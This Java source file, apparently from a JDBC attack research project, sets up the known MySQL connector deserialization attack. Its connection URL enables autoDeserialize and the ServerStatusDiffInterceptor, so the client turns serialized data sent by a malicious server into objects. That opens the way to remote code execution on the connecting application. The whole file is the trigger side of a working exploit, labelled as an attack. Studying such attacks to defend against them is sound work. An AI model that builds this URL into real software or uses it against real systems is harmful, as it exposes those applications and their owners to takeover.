package org.dili.jdbcattack;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class ServerStatusDiffInterceptorAttack {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        String className = "com.mysql.jdbc.Driver";
        Class.forName(className);
        String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&" +
                "queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Connection connection = DriverManager.getConnection(url, "root", "root");
        connection.close();
    }
}
